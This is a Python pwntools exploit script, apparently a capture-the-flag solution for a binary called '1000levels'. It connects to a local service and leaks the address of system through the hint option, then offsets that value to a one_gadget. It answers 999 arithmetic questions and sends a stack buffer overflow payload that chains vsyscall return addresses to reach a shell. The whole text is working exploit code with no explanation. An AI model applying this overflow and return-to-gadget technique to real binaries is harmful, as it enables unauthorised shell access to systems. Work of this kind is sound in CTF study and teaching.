from pwn import *

io = remote('127.0.0.1', 10001)	# io = process('./1000levels')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

one_gadget = 0x4526a
system_offset = libc.sym['system']
ret_addr = 0xffffffffff600000		# vsyscall

def go(levels, more):
	io.sendlineafter("Choice:\n", '1')
	io.sendlineafter("levels?\n", str(levels))
	io.sendlineafter("more?\n", str(more))

def hint():
	io.sendlineafter("Choice:\n", '2')

def pwn():
	hint()
	go(0, one_gadget - system_offset)

	for i in range(999):
		io.recvuntil("Question: ")
		a = int(io.recvuntil(" ")[:-1])
		io.recvuntil("* ")
		b = int(io.recvuntil(" ")[:-1])
		io.sendlineafter("Answer:", str(a * b))

	payload  = 'A' * 0x30			# buffer
	payload += 'B' * 0x8			# rbp
	payload += p64(ret_addr) * 3
	io.sendafter("Answer:", payload)
	io.interactive()

if __name__ == "__main__":
	pwn()
